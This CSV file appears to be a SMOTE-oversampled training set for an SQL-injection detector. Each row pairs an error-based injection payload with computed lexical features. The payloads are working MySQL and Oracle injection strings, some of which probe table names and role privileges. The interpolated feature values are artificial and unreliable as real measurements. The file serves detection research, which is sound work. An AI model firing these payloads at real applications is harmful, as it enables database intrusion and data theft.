id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001363,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.16271425493664632,346.93230757081056,38.93230757081058,3.837763445253991,109.93230757081058,55.0,141.0,41.0,0.3168692583355442,0.15853245059723658,0.4064195551674611,0.11817873589975818,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.9323075708105772,0.06769242918942286,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001364,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.6505098411103466,252.14894203685583,35.26767367979715,3.992774095787805,95.0706947191886,36.070694719188594,90.60604207878289,30.401510519695723,0.37723337580781485,0.14286795177287576,0.3592907069351658,0.12060796548414363,0.0,0.0,0.2676736797971495,0.0,2.0,1.1338368398985748,0.0,18.133836839898574,0.0,2.0,5.866163160101426,3.4015105196957247,0.0,0.0,0.13383683989857476,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.13383683989857473,2.0,0.13383683989857464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.267673679797149
SMOTE_001365,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,0.9908575029418015,346.5877831885055,38.587783188505526,3.8412497174100726,109.58778318850553,55.0,141.0,41.0,0.3161891740573688,0.15869027606263594,0.40682416226966667,0.11829638761032861,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.5877831885055285,0.4122168114944717,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001366,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.7085640466528508,215.5072733376813,41.00290933507252,4.26694384691164,118.50436400260878,2.0,71.0,24.002909335072523,0.5498789368145531,0.00928167836767535,0.32949958205247504,0.11133980276529651,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,5.002909335072524,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_001367,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000077,0.022388155620374155,217.78359006434886,38.04328198713023,3.7451661531266893,63.0,37.0,92.82687205147909,24.95671801286977,0.2892844429931951,0.16989721255155904,0.4262261323865701,0.11459221206867573,1.0,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,16.95671801286977,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001368,attack,error,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejul'  =  'ejul",nearest_attack_euclidean,R000009,1.9402776449399428,343.83925323526927,38.54846474789561,3.815949417163891,105.9361827310605,55.0,141.0,41.90307050420878,0.3079974364451464,0.1599749200886607,0.41011752240911203,0.12191012105708092,4.0,0.0,0.0,0.0,2.0,2.0,0.0,26.0,0.9030705042087797,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.5484647478956102,0.45153525210438983,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001369,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000020,1.3332992189111001,228.93035509800222,39.95046566069585,3.837520455760417,68.22756113382715,40.801862642783384,94.9009313213917,25.0,0.29757501153451177,0.17780240811414016,0.4151448476140923,0.10947773273725578,0.0,1.0,1.0,0.0,1.0,1.475232830347923,0.0,16.524767169652076,0.0,0.0,3.0,3.475232830347923,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.47523283034792313,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.475232830347924
SMOTE_001370,attack,error,"1'||  (  select 'vsfg' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",nearest_attack_euclidean,R000023,1.1897612465894225,193.62498601011492,33.791671329961694,3.9699961894080134,51.81943356342271,47.0,66.80555244669219,28.0,0.2673649315671697,0.2428623553960486,0.3450887566306251,0.1446839564061566,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,6.0,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.402776223346102,0.5972237766538979,0.4027762233461022,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.402776223346102
SMOTE_001371,attack,error,"-9176'   )    )    as eunw where 5978  =  5978 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000065,0.6170789089362433,241.0,41.0,3.913022097336653,74.0,45.0,97.0,25.0,0.3070539419087137,0.18672199170124482,0.4024896265560166,0.1037344398340249,0.8102791669764123,0.1897208330235876,1.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.0,4.0,0.8102791669764122,0.1897208330235876,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,7.0
SMOTE_001372,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,0.5516645667234162,343.4643546059906,34.0,3.634207616446881,92.46435460599058,52.89031104328504,140.21937791342992,57.89031104328504,0.26908842774292774,0.15400452310360208,0.40834253457064357,0.16856451458282662,1.0,0.0,1.890311043285041,0.0,0.0,2.890311043285041,0.0,28.219377913429916,0.0,2.670933129855123,0.1096889567149586,24.780622086570084,1.0,0.0,0.8903110432850411,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.890311043285041,1.0,0.8903110432850411,0.10968895671495899,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.890311043285041
SMOTE_001373,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.46771496501409454,253.0071213544579,35.28887238583411,3.993854039368863,95.63694351972663,35.770326362224296,90.8295251102827,30.770326362224292,0.3781625347523274,0.14134128616163438,0.3589796831559591,0.12151649593007914,0.3851631811121461,0.0,0.0,0.0,2.0,1.0962907952780365,0.0,18.192581590556074,0.0,2.0,5.903709204721963,3.28887238583411,0.09629079527803663,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0962907952780365,0.0,0.09629079527803658,2.0,-1.1102230246251565e-16,0.09629079527803663,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.28887238583411
SMOTE_001374,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000003,0.014309260535504567,253.82819804682765,43.99045544704598,4.4660770778112395,147.86637625864373,2.0,76.97136634113795,26.99045544704598,0.5825234100044249,0.007880221120897646,0.3032571660955593,0.1063392027791182,3.0,0.0,0.0,0.0,0.0,3.99522772352299,0.0,10.0,0.0,6.995227723522991,1.0,3.9952277235229903,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9952277235229905,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.995227723522991
SMOTE_001375,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000074,0.008005668290473215,249.03474333971104,36.001240833561106,4.012248365526934,94.00620416780555,35.0,89.01985333697773,31.00868583492776,0.3774850878438047,0.1405446186639716,0.357456560156484,0.12451373333573963,0.9987591664388916,0.004963334244433626,0.0,0.0,2.0,1.0012408335611083,0.0,18.00248166712222,0.0024816671222168962,2.0,5.998759166438892,3.0012408335611083,0.9987591664388914,0.0012408335611085175,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.0012408335611083787,0.0012408335611085453,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.002481667122217
SMOTE_001376,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000029,1.592010342349263,198.49124378134417,30.378522538828612,3.753245585412687,59.5986310872011,38.242954922342776,75.64965777180028,25.0,0.29681039026203027,0.1942610867600367,0.38218627067110345,0.12674225230682956,4.0,0.0,0.0,0.0,0.0,1.3785225388286106,0.0,14.0,0.0,0.0,5.62147746117139,1.3785225388286104,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.6214774611713894,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3785225388286107,0.3785225388286107,4.37852253882861
SMOTE_001377,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.10146154898194219,332.7247564253604,32.931189106340106,3.457836927847582,81.27524357463959,48.862378212680206,145.65594553170052,56.9311891063401,0.24429615005683336,0.14684831489932867,0.437751124268456,0.17110441077538194,0.9655945531700516,0.0,0.0,0.0,0.0,2.0,0.0,30.931189106340103,0.0,0.10321634048984552,0.9655945531700514,22.0,0.9655945531700514,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001378,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,1.3784997888601844,239.4711071910774,31.7841984019828,3.78564870159138,78.5683968039656,40.136793607931196,93.3343135831462,27.431603196034402,0.32835364865201155,0.16796471950788608,0.3892428595827932,0.11443877225730918,3.2158015980172,0.0,0.0,0.0,0.0,2.0,0.0,16.431603196034402,0.0,0.0,5.0,2.784198401982799,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3920992009914,0.0,0.39209920099139983,0.0,0.6079007990086002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.3920992009913995
SMOTE_001379,attack,error,"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000040,1.282593840268154,319.61148751848475,40.0,4.0405768042705485,109.32831704713497,58.52211364756651,116.76105682378326,35.0,0.3425606528883461,0.1822713957965603,0.36544445033886125,0.10972350097623243,1.0,0.0,2.0,0.0,2.0,2.0,0.0,20.776105682378326,0.0,0.4477886352433481,5.776105682378326,6.776105682378326,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.328317047134979,2.3283170471349774,1.0,1.223894317621674,0.7761056823783259,0.22389431762167414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.22389431762167408,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.104422729513303
SMOTE_001380,attack,error,"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000078,0.7421787696310614,330.33510389916535,33.50265584874805,3.520221915967685,82.0106233949922,51.329792201669264,140.82713635292123,56.16755194958269,0.2482356462980485,0.15539801043988918,0.4263359825007532,0.17003036076130912,0.0,0.0,1.3351038991653663,0.0,0.0,2.0,0.0,29.664896100834632,0.0,0.5026558487480495,0.8324480504173168,23.335103899165365,0.0,0.0,0.16755194958268313,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001381,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000019,0.2298020199333331,210.10119248235512,39.0,3.8289719857413416,63.0,37.0,86.51530784201867,23.585884640336445,0.2999367535806469,0.17615333146799902,0.41165856327590983,0.1122513516754442,1.0,0.0,1.0,0.0,1.0,0.9999999999999999,0.0,15.585884640336447,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_001382,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,0.4576038014949105,325.6730151404886,31.26920605619543,3.5300666143564077,87.78857274712057,45.942221196683995,136.8076181685863,55.134603028097715,0.26961666942014645,0.14103437023403556,0.4200554391205976,0.1692935212252204,0.0,0.0,0.1346030280977139,0.0,0.0,2.0,0.0,29.134603028097715,0.0,2.596190915706858,0.13460302809771374,22.13460302809771,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.865396971902286,0.13460302809771407,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001383,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,0.07737160331552255,219.37990147367879,31.96352361609875,3.9184547510024212,80.41637785758003,37.036476383901245,77.90880904024688,24.018238191950623,0.36627153248532807,0.16893862292111828,0.3552371865568761,0.10955265803667756,4.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,14.0,0.0,0.0,5.018238191950624,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0182381919506238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9817618080493762,0.9817618080493762,4.981761808049376
SMOTE_001384,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,1.0688291121042315,328.07623426295936,34.0,3.5337015163599754,82.92376573704064,50.53811713147968,138.3452928286992,56.26905856573984,0.25293152112393913,0.15399579647793896,0.42157143341744413,0.17150124898067778,0.6345292828699203,0.0,1.0,0.0,0.0,2.0,0.0,29.26905856573984,0.0,1.0964121513902392,0.63452928286992,23.0,0.6345292828699203,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001385,attack,error,"1""  )   as zbhs where 2017  =  2017 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R000042,0.25629837841832853,326.1065099121284,40.10650991212838,4.025330653880603,109.10650991212837,63.0,119.0,35.0,0.33457264076595056,0.19318858816472403,0.36491177764447874,0.1073269934248467,0.0,1.0,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.10650991212837913,0.8934900878716208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001386,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000068,1.0210599765412103,342.7326806986513,37.748667746050096,3.846016638132062,107.24067422235068,57.01065803159923,138.98934196840077,39.49200647630058,0.3128366321649425,0.16655722404925893,0.4054748766907674,0.11513126709503115,2.9946709842003862,0.0,0.0,0.0,2.0,2.0,0.0,25.49733549210019,0.0,0.0,6.0,5.0,0.7486677460500966,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2513322539499034,0.7486677460500966,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
